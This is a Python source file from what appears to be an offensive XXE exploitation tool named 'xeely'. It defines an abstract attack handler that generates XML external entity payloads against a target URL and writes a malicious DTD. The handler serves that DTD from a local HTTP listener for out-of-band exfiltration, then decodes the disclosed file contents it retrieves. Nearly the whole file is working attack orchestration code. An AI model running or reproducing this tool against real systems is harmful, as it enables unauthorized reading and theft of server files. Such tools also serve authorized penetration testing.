import base64
import os
from abc import ABC
from abc import abstractmethod
from typing import cast
from typing import Optional
from urllib.parse import quote_plus

from xeely import RESOURCES_PATH
from xeely.custom_http import HTTPClient
from xeely.custom_http.response import HTTPResponse
from xeely.custom_http.server import HTTPServerParams
from xeely.custom_http.server import run_http_server
from xeely.custom_xml import XML
from xeely.xxe.attack.mode import XXEAttackMode
from xeely.xxe.attack.payload import payload_factory
from xeely.xxe.attack.payload.abstract import AbstractPayloadGenerator
from xeely.xxe.attack.type import XXEAttackType


class AbstractXXEAttackHandler(ABC):
    def __init__(
        self,
        resource: str,
        xml: XML,
        target_url: str,
        attack_mode: XXEAttackMode,
        attack_type: XXEAttackType = XXEAttackType.FILE_DISCLOSURE,
        should_apply_base64_encoding: bool = False,
        should_use_cdata: bool = False,
        http_server_params: Optional[HTTPServerParams] = None,
        payload_prefix: str = "",
    ):
        self._should_apply_base64_encoding = should_apply_base64_encoding
        self._target_url = target_url
        self._resource = resource
        self._attack_mode = attack_mode
        self._attack_type = attack_type
        self._should_use_cdata = should_use_cdata
        self._http_server_params = http_server_params
        self._base_xml = xml
        self._payload_prefix = payload_prefix

    def _pre_attack_verification(self) -> bool:
        return True

    @abstractmethod
    def _get_exfiltrated_data(self, **kwargs) -> str:
        raise NotImplementedError()

    def change_attack_type(self, attack_type: XXEAttackType):
        self._attack_type = attack_type

    def change_resource(self, resource: str):
        self._resource = resource

    def _send_request(self, data: str) -> HTTPResponse:
        if self._payload_prefix != "":
            data = quote_plus(data)

        return HTTPClient.send_post_request(
            url=self._target_url, data=f"{self._payload_prefix}{data}"
        )

    def run_attack(self) -> str:
        if not self._pre_attack_verification():
            return ""

        payload_generator: AbstractPayloadGenerator = (
            payload_factory.get_payload_generator_for_mode(
                self._attack_mode,
                base_xml=self._base_xml,
                resource=self._resource,
                attack_type=self._attack_type,
                should_apply_base64_encoding=self._should_apply_base64_encoding,
                should_use_cdata=self._should_use_cdata,
                http_server_params=self._http_server_params,
            )
        )

        if payload_generator.does_payload_requires_to_expose_dtd_file():
            dtd_file_path = RESOURCES_PATH / payload_generator.get_dtd_file_name()
            with open(dtd_file_path, "w") as file:
                file.write(payload_generator.get_dtd_content())

            lhost = cast(HTTPServerParams, self._http_server_params).get_host()
            lport = cast(HTTPServerParams, self._http_server_params).get_port()

            with run_http_server(lhost=lhost, lport=lport):
                payload = payload_generator.generate_payload()
                http_response = self._send_request(payload)

            os.remove(dtd_file_path)
        else:
            http_response = HTTPClient.send_post_request(
                url=self._target_url, data=payload_generator.generate_payload()
            )

        exfiltrated_data = self._get_exfiltrated_data(http_response=http_response.body)

        if exfiltrated_data == "":
            return exfiltrated_data

        return (
            base64.b64decode(exfiltrated_data).decode("utf-8")
            if self._should_apply_base64_encoding
            else exfiltrated_data
        )
